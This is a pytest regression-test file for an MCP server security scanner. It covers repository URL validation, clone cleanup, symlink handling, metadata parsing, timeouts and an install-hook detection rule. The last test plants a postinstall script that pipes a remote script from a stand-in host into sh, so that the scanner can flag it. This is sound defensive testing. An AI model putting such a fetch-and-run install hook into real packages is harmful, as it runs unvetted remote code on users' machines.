"""Regression tests for MCP parser and batch-scan boundary handling."""

import json
from contextlib import contextmanager
from types import SimpleNamespace

from waingro.mcp.batch import (
    BatchConfig,
    ScanTimedOutError,
    _clone_repo,
    _normalize_github_repo_url,
    _scan_entry,
    run_batch_scan,
)
from waingro.mcp.discovery import MCPServerEntry
from waingro.mcp.parser import parse_mcp_server
from waingro.mcp.scanner import scan_server


def test_github_clone_url_requires_exact_https_repository_shape():
    assert (
        _normalize_github_repo_url("https://github.com/owner/repo")
        == "https://github.com/owner/repo.git"
    )
    assert (
        _normalize_github_repo_url("git+https://github.com/owner/repo.git")
        == "https://github.com/owner/repo.git"
    )
    assert _normalize_github_repo_url("https://evil.example/github.com/owner/repo") is None
    assert _normalize_github_repo_url("https://github.com/owner/repo/tree/main") is None
    assert _normalize_github_repo_url("https://github.com/owner/repo?ref=main") is None
    assert _normalize_github_repo_url("https://user@github.com/owner/repo") is None
    assert _normalize_github_repo_url("https://github.com:notaport/owner/repo") is None
    assert _normalize_github_repo_url("file:///tmp/repo") is None


def test_failed_clone_removes_partial_destination(tmp_path, monkeypatch):
    destination = tmp_path / "clone"
    monkeypatch.setattr("waingro.mcp.batch.shutil.which", lambda _name: "/usr/bin/git")

    def failed_run(*_args, **_kwargs):
        destination.mkdir()
        return SimpleNamespace(returncode=1)

    monkeypatch.setattr("waingro.mcp.batch.subprocess.run", failed_run)
    assert not _clone_repo("https://github.com/owner/repo", destination)
    assert not destination.exists()


def test_existing_non_repository_is_not_accepted_as_clone(tmp_path):
    destination = tmp_path / "clone"
    destination.mkdir()
    assert not _clone_repo("https://github.com/owner/repo", destination)


def test_existing_non_repository_is_not_scanned(tmp_path):
    destination = tmp_path / "clones" / "owner__repo"
    destination.mkdir(parents=True)
    summary = _scan_entry(
        MCPServerEntry(
            name="owner/repo",
            source="test",
            url="https://github.com/owner/repo",
        ),
        BatchConfig(
            manifest_path=tmp_path / "unused.json",
            clone_dir=tmp_path / "clones",
            results_path=tmp_path / "results.json",
        ),
    )
    assert summary.error == "clone_failed"
    assert summary.cloned is False


def test_cleanup_preserves_preexisting_repository(tmp_path, monkeypatch):
    destination = tmp_path / "clones" / "owner__repo"
    (destination / ".git").mkdir(parents=True)
    monkeypatch.setattr(
        "waingro.mcp.batch.scan_server",
        lambda path: SimpleNamespace(
            server_path=path,
            metadata=SimpleNamespace(name="repo", version=None, tools=[]),
            verdict="CLEAN",
            files_scanned=0,
            rules_evaluated=0,
            findings=[],
        ),
    )
    summary = _scan_entry(
        MCPServerEntry(
            name="owner/repo",
            source="test",
            url="https://github.com/owner/repo",
        ),
        BatchConfig(
            manifest_path=tmp_path / "unused.json",
            clone_dir=tmp_path / "clones",
            results_path=tmp_path / "results.json",
            cleanup_after_scan=True,
        ),
    )
    assert summary.error is None
    assert destination.exists()


def test_parser_does_not_skip_source_because_parent_is_named_build(tmp_path):
    server = tmp_path / "build" / "server"
    source_dir = server / "src"
    source_dir.mkdir(parents=True)
    (server / "package.json").write_text(
        '{"name":"test-mcp","dependencies":{"@modelcontextprotocol/sdk":"1"}}',
        encoding="utf-8",
    )
    source = source_dir / "index.js"
    source.write_text("server.tool('hello', 'Say hello', {}, handler)\n", encoding="utf-8")
    parsed = parse_mcp_server(server)
    assert source in parsed.source_content


def test_mcp_parser_does_not_follow_external_file_symlink(tmp_path):
    server = tmp_path / "server"
    server.mkdir()
    outside = tmp_path / "outside.py"
    outside.write_text("print('outside')\n", encoding="utf-8")
    linked = server / "linked.py"
    linked.symlink_to(outside)
    parsed = parse_mcp_server(server)
    assert linked not in parsed.source_content


def test_parser_normalizes_malformed_package_metadata(tmp_path):
    server = tmp_path / "server"
    server.mkdir()
    (server / "package.json").write_text(
        json.dumps(
            {
                "name": 42,
                "dependencies": ["not", "a", "mapping"],
                "devDependencies": None,
                "scripts": "not a mapping",
            }
        ),
        encoding="utf-8",
    )
    parsed = parse_mcp_server(server)
    assert parsed.metadata.name == "server"
    assert parsed.metadata.dependencies == {}
    assert parsed.metadata.scripts == {}


def test_mcp_parser_rejects_a_file_path(tmp_path):
    source = tmp_path / "server.py"
    source.write_text("print('not a server directory')\n", encoding="utf-8")
    try:
        parse_mcp_server(source)
    except NotADirectoryError as exc:
        assert "not a directory" in str(exc)
    else:
        raise AssertionError("a file path must not scan as an empty MCP server")


def test_skipped_manifest_entry_is_not_counted_as_cloned(tmp_path):
    manifest = tmp_path / "manifest.json"
    manifest.write_text(
        json.dumps([{"name": "bad", "source": "test", "url": "https://evil.example/x"}]),
        encoding="utf-8",
    )
    result = run_batch_scan(
        BatchConfig(
            manifest_path=manifest,
            clone_dir=tmp_path / "clones",
            results_path=tmp_path / "results.json",
        )
    )
    assert result.total_failed == 1
    assert result.total_cloned == 0
    assert result.total_scanned == 0


def test_scan_timeout_is_reported_without_scanning_partial_result(tmp_path, monkeypatch):
    clone = tmp_path / "clones" / "owner__repo"
    (clone / ".git").mkdir(parents=True)

    @contextmanager
    def immediate_timeout(_seconds):
        raise ScanTimedOutError
        yield

    monkeypatch.setattr("waingro.mcp.batch._scan_deadline", immediate_timeout)
    summary = _scan_entry(
        MCPServerEntry(
            name="owner/repo",
            source="test",
            url="https://github.com/owner/repo",
        ),
        BatchConfig(
            manifest_path=tmp_path / "unused.json",
            clone_dir=tmp_path / "clones",
            results_path=tmp_path / "results.json",
        ),
    )
    assert summary.error == "scan_timeout"
    assert summary.cloned is True


def test_mcp_lifecycle_rule_ignores_harmless_inline_logging(tmp_path):
    server = tmp_path / "server"
    server.mkdir()
    (server / "package.json").write_text(
        json.dumps(
            {
                "name": "test-mcp",
                "scripts": {"postinstall": 'node -e "console.log(1)"'},
            }
        ),
        encoding="utf-8",
    )
    result = scan_server(server)
    assert "MCP-009" not in {finding.rule_id for finding in result.findings}


def test_mcp_lifecycle_rule_detects_remote_shell_fetch(tmp_path):
    server = tmp_path / "server"
    server.mkdir()
    (server / "package.json").write_text(
        json.dumps(
            {
                "name": "test-mcp",
                "scripts": {"postinstall": "curl https://example.invalid/install.sh | sh"},
            }
        ),
        encoding="utf-8",
    )
    result = scan_server(server)
    assert "MCP-009" in {finding.rule_id for finding in result.findings}
